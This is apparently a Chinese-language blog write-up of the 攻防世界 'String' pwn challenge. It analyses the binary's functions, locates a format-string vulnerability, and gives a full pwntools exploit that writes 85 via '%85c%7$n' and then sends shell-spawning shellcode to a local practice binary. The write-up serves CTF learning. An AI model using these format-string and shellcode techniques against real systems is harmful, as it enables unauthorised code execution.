---
title: 「攻防世界」Pwn - String WriteUp
date: 2021-12-30
tags: ["CTF", "Pwn", "writeup", "wp"]
authors: [nova]
---

## 写在开头的碎碎念

捏 🐎 咋这个 Pwn 这么难的啊，看 WP 也看不懂，~~即刻退出 Pwn~~

说归说，至少先把这个攻防世界新手区给它干了

经过几天的~~并不系统的三天打鱼两天晒网的~~学习，现在只能说非常有自信。

**String**应该是攻防世界新手区里最有趣也最难的一题了，开整！

<!--truncate-->

## 开整

### 分析

![exeinfope](https://oss.nova.gal/img/image-20211101153717286.png)

![checksec](https://oss.nova.gal/img/image-20211101153833049.png)

总而言之先扫一遍， 64bit 没有 PIE

先看看 main

![main](https://oss.nova.gal/img/image-20211101153942250.png)

v4 申请了一个**8 字节长**的内存地址，保存的是`68, 85`两个数据，同时它把这两个数据的地址 print 了出来

跟进到`sub_400D72()`看看

![sub_400D72()](https://oss.nova.gal/img/image-20211101154214749.png)

让我们输入名字，但是下面对 s 的长度做了检测所以没办法溢出。

继续看看其他函数，首先是`sub_400A7D()`

![sub_400A7D()](https://oss.nova.gal/img/image-20211101154750528.png)

> 为了训练英语水平这里顺带打个翻译(?)
>
> > 这是一个有名却分外不同寻常的小酒馆。这里空气清新，大理石铺成的地板也很干净。几乎看不到吵闹的客人，家具也没有被在这个世界的其他酒馆寻常可见的打架斗殴所损坏。装饰极其华丽，看着很适合摆在宫殿里，但在这个城市这却是极其平常的。房间中央是天鹅绒覆盖的椅子和长凳，有很大的橡木桌子围绕。一个大告示固定在一根木条后的北面的墙上。在一个角落你发现了一个壁炉。有两个明显的出口：向东，向上。但奇怪的是，并没有人在那，那么你要向哪里走呢？
>
> 这个背景不能说毫无吸引力只能说翻译了是纯纯浪费时间
>
> ~~我是傻宝~~

所以要我们给出选择：`east`Or`up`

但是看下面的代码我们发现了：你只能选择`east`（选择了`up`之后你就会面临无尽之洞），继续接下来看`sub_400BB9()`

![sub_400BB9()](https://oss.nova.gal/img/image-20211101173616709.png)

这里提到了`address`，很容易联想到前面我们的`v4`，估计是要在 v2 和 format 做文章，但是具体怎么操作还不清楚，继续看`sub_400CA6()`

![sub_400CA6()](https://oss.nova.gal/img/image-20211101174119436.png)

这里的 a1 其实就是我们最开始的 v4，所以我们需要让`*v4 = v4[1]`

注意下`((void (__fastcall *)(_QWORD))v1)(0LL);`这行，这里把 v1 转换成了可执行函数（void 为返回值类型，\_\_fastcall 为协议），在这里我们就可以打 shellcode 了。

### Payload

接下来就是如何实现的问题了。

先把前面几个固定步骤的写了

![exp_01](https://oss.nova.gal/img/image-20211102105044906.png)

这里就需要引入格式化字符串的漏洞，[传送门](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)

我们需要找一下 v4 所在的参数位置，传入 payload

```python
payload = 'AAAA'+'.%x'*10
```

![addr_info](https://oss.nova.gal/img/image-20211102105300535.png)

可以看到我们的`41414141`位于栈内第八个位置，而我们刚才写入的 v4_addr 是位于前一个位置的，此时

就可以构造 payload 使得\*v4=85 了

```python
payload = '%85c%7$n'
```

![return_0](https://oss.nova.gal/img/image-20211102105850378.png)

这时候我们已经满足`sub_400CA6()`中的条件了，那么只需要轻松写入一个 shellcode，就可以拿到 shell 了。

完整 payload:

```python
from pwn import *
context(log_level='debug')

sh = process('./1d3c852354df4609bf8e56fe8e9df316')

sh.recvuntil('secret[0] is ')
v4_addr = int(sh.recvuntil('\n')[:-1], 16)
print(v4_addr)

sh.recvuntil('be:')
sh.sendline(b'yuusya')
sh.sendlineafter('east or up?:\n', b'east')
sh.sendlineafter('leave(0)?:\n', b'1')

# *v4 = 85
sh.sendlineafter("address'\n", str(v4_addr))
payload = '%85c%7$n'
sh.sendline(payload)
sh.recvuntil('I hear it')
context(arch='amd64', os='linux')
sh.sendlineafter('SPELL', asm(shellcraft.sh()))
sh.interactive()
```
